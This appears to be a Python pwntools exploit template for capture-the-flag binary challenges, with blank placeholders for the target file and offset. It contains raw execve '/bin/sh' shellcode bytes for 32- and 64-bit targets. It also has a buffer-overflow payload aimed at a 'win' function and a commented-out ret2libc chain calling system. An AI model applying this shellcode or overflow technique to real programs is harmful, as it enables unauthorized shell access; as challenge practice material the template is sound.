from pwn import *

FILENAME = ""
OFFSET = 0

exe = ELF(f"./{FILENAME}")
# libc = ELF("libc.so.6")

p = process([exe.path])

binsh = b"\x99\x52\x58\x52\xbf\xb7\x97\x39\x34\x01\xff\x57\xbf\x97\x17\xb1\x34\x01\xff\x47\x57\x89\xe3\x52\x53\x89\xe1\xb0\x63\x2c\x58\x81\xef\x62\xae\x61\x69\x57\xff\xd4"   
binsh64 = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

### get there
p.sendlineafter(b"", b"")
p.sendlineafter(b"", b"")
p.sendlineafter(b"", b"")
p.sendlineafter(b"", b"")
p.sendlineafter(b"", b"")
p.sendlineafter(b"", b"")
###

# exe_rop = ROP(exe)
# pop_rdi = exe_rop.rdi.address
# ret = pop_rdi+1

# libc.address = ?????

# libc_system = libc.sym["system"]
# binsh = next(libc.search(b"/bin/sh"))
# libc_exit = libc.sym["exit"]

payload = b"A" * OFFSET
payload += p64(exe.sym["win"])

# payload += p64(pop_rdi)
# payload += p64(binsh)
# payload += p64(ret)
# payload += p64(libc_system)

p.interactive()